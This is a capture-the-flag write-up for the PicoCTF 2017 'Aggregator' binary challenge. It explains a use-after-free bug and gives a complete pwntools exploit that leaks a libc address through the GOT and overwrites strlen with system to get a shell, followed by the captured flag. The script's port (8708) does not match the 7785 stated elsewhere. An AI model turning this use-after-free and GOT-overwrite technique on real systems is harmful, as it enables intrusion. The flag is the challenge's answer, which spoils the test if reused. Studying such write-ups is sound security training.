# PicoCTF_2017: Aggregator

**Category:** Binary
**Points:** 190
**Description:**

I wrote a program to help me synthesize my log files. You can edit the log files to add annotations that will print out aggregated information. Because the original program that outputs the logs was a bit faulty, I also included the ability to clear a single day of logs.  
Find my aggregator running on shell2017.picoctf.com:7785. [aggregator.c](https://webshell2017.picoctf.com/static/2745e04028ecf1c8ae15c70bb085f5e6/aggregator.c)  [aggregator](https://webshell2017.picoctf.com/static/2745e04028ecf1c8ae15c70bb085f5e6/aggregator)

**Hint:**

Does it look like there is a stack vulnerability?

## Write-up

In my opinion the main difficulty in this challenge was to read these 350 lines of code. The vulnerability was rather an obvious one. Very often if the application allows to remove data (and in this challenge it's even mentioned in description), there is  `use-after-free`  flaw.

When we add some value to database and then remove it, the memory will be freed, but the pointer in  `D->table[offset]`won't be reset, so we can still use this data. Our buffer is also stored on heap, so we can overwrite old content just by sending any string. Then we can use aggregate function to read some pointers from  `.got.plt`.

``` text
$ r2 /lib/x86_64-linux-gnu/libc.so.6
[0x00021c50]> ?v sym.free
0x7c600
[0x00021c50]> ?v sym.system
0x41490

```

With this knowledge we can easily calculate  `system`  address and now we only have to write it to  `.got.plt`. We add another value to database and immediately remove it. Then we overwrite the memory with fake  `data_table_chain`  using the vulnerability. We set  `*data`  pointer to  `strlen@got.plt`  and then add next value to database (`system`  address).

```python
#!/usr/bin/env python2

from pwn import *

from struct import pack,unpack

FREE_GOT_PLT = 0x601EF0

STRLEN_GOT_PLT = 0x601F00

FREE_OFFSET = 0x7c600

SYSTEM_OFFSET = 0x41490

r = remote("shell2017.picoctf.com", 8708)

r.send("09-24-2018 0\n")

r.send("~09-24-2018\n")

payload = pack("<Q",FREE_GOT_PLT)+pack("<Q",24)+pack("<Q",2)+pack("<Q",1)+pack("<Q",0)

r.send(payload+"\n")

r.recv()

r.send("ax 09-2018\n")

free_libc = int(r.recv().splitlines()[-1])

libc_base = free_libc-FREE_OFFSET

system_libc = libc_base+SYSTEM_OFFSET

r.send("09-25-2018 0\n")

r.send("~09-25-2018\n")

payload = pack("<Q",STRLEN_GOT_PLT)+pack("<Q",25)+pack("<Q",2)+pack("<Q",0)+pack("<Q",0)

r.send(payload+"\n")

r.send("09-25-2018 %d\n"%system_libc)

r.interactive()
```
```text
$ python solve.py 
[+] Opening connection to shell2017.picoctf.com on port 7785: Done
[*] Switching to interactive mode
$ ls
aggregator
flag.txt
xinetd_wrapper.sh
$ cat flag.txt
a65b3f946c058f6dbec3d14d8449a468
```
Flag : `a65b3f946c058f6dbec3d14d8449a468`

Thanks [BOAKGP](https://github.com/BOAKGP/CTF-Writeups/tree/master/PicoCTF%202017/Level%204/Binary%20Exploitation/Aggregator)
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjEyNjE2MTM5NywzNjUyNDI4Ml19
-->